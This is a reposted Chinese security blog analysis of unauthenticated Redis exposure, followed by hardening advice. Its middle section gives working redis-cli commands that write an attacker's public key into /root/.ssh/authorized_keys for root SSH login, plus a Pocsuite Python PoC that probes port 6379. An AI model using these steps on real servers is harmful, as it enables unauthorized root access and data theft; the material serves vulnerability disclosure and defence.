---
title: Redis 未授权访问配合 SSH key 文件利用分析
tags:
  - redis
  - 漏洞
id: '85'
categories:
  - - 技术
date: 2016-12-30 15:55:21
---

_Redis_是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 Redis 未授权访问的问题是一直存在的问题，知道创宇安全研究团队历史上也做过相关的应急，今日，又出现 Redis 未授权访问配合 SSH key 文件被利用的情况，导致一大批 Redis 服务器被黑，今天我们来简要的分析下。

## **一、漏洞概述**

Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。

### **1、漏洞描述**

Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。 Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。 因为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。 利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized\_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。

### **2、漏洞影响**

Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。 通过ZoomEye 的搜索结果显示，有97707在公网可以直接访问的Redis服务。 ![](http://blog.knownsec.com/wp-content/uploads/2015/11/QQ20151111-0@2x.png) 根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下： ![](http://blog.knownsec.com/wp-content/uploads/2015/11/1.jpg) 全球无验证可直接利用Redis TOP 10国家与地区： ![](http://blog.knownsec.com/wp-content/uploads/2015/11/2.jpg)

### 3、漏洞分析与利用

首先在本地生产公私钥文件：

```
$ssh-keygen –t rsa
```

![](http://blog.knownsec.com/wp-content/uploads/2015/11/ssh-keygen.png) 然后将公钥写入 foo.txt 文件

```
$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
```

再连接 Redis 写入文件

```
$ cat foo.txt  redis-cli -h 192.168.1.11 -x set crackit
$ redis-cli -h 192.168.1.11
$ 192.168.1.11:6379> config set dir /root/.ssh/
OK
$ 192.168.1.11:6379> config get dir
1) "dir"
2) "/root/.ssh"
$ 192.168.1.11:6379> config set dbfilename "authorized_keys"
OK
$ 192.168.1.11:6379> save
OK
```

![](http://blog.knownsec.com/wp-content/uploads/2015/11/redis_ssh.png) 这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized\_keys 文件里，然后攻击者直接执行：

```
$ ssh –i  id_rsa root@192.168.1.11
```

即可远程利用自己的私钥登录该服务器。 当然，写入的目录不限于 /root/.ssh 下的authorized\_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。

### 4、Redis 未授权的其他危害与利用

#### a）数据库数据泄露

Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。 ![](http://blog.knownsec.com/wp-content/uploads/2015/11/redis_user.png)

#### b）代码执行

Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下        一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的. ![](http://blog.knownsec.com/wp-content/uploads/2015/11/redis_lua.png) 通过[Lua代码](https://github.com/evilpacket/redis-sha-crack)攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。

#### c）敏感信息泄露

通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。 ![](http://blog.knownsec.com/wp-content/uploads/2015/11/redis_info.png) 可以看到泄露了很多 Redis 服务器的信息, 有当前 Redis 版本, 内存运行状态, 服务端个数等等敏感信息。

### 5、漏洞验证

可以使用Pocsuite（http://github.com/knownsec/pocsuite）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。

```
#!/usr/bin/env python
# -*- coding:utf-8 -*-
 
import socket
import urlparse
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
 
 
class TestPOC(POCBase):
    vulID = '89339'
    version = '1'
    author = ['Anonymous']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['http://sebug.net/vuldb/ssvid-89339']
    name = 'Redis 未授权访问 PoC'
    appPowerLink = 'http://redis.io/'
    appName = 'Redis'
    appVersion = 'All'
    vulType = 'Unauthorized access'
    desc = '''
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
    '''
    samples = ['']
 
    def _verify(self):
        result = {}
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = urlparse.urlparse(self.url).netloc
            port = 6379
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and 'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Port'] = port
        except:
            pass
        s.close()
        return self.parse_attack(result)
 
    def _attack(self):
        return self._verify()
 
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output
 
register(TestPOC)
```

## 二、安全建议

1.  配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379
2.  配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中
3.  配置rename-command 配置项 “RENAME\_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度
4.  好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config

## 三、参考链接

1.  http://www.sebug.net/vuldb/ssvid-89339
2.  http://antirez.com/news/96
3.  http://www.secpulse.com/archives/5366.html
4.  http://www.sebug.net/vuldb/ssvid-89715

  转载自：http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/